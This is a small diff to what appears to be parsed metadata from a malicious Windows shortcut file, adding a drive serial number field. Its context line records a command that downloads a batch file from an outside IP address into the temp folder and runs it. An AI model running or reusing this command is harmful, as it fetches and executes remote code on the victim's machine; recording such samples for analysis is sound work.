@@ -41,6 +41,7 @@
           "command_line_arguments": "/c \"curl http://121.5.28.63/cmd.txt > %temp%\\\\cmd.bat && %temp%\\\\cmd.bat\"",
           "create_date": "2021:09:18 17:06:25+00:00",
           "cursor_size": 25,
+          "drive_serial_number": "F63E-B37C",
           "drive_type": "Fixed Disk",
           "file_attributes": "Archive",
           "fill_attributes": "0x07",
